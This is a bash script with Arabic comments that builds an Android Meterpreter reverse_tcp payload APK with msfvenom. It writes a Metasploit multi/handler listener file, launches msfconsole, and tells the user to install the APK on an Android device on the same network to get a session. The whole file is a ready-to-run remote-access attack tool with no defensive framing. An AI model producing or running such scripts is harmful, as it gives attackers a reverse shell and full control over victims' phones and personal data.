#!/bin/bash

# معلومات الاتصال
LHOST="192.168.1.9"
LPORT="4444"
APK_NAME="android_payload.apk"

# توليد البايلود
echo "[*] توليد بايلود أندرويد..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > $APK_NAME

echo "[+] تم حفظ البايلود في: $APK_NAME"

# إنشاء ملف إعداد المستمع
echo "[*] إعداد مستمع Metasploit..."
cat <<EOF > listener.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

# تشغيل msfconsole في نافذة xterm
echo "[*] تشغيل msfconsole..."
xterm -e "msfconsole -r listener.rc" &

echo "[✔] السكربت جاهز. قم بتثبيت $APK_NAME على جهاز أندرويد في نفس الشبكة لتبدأ الجلسة."
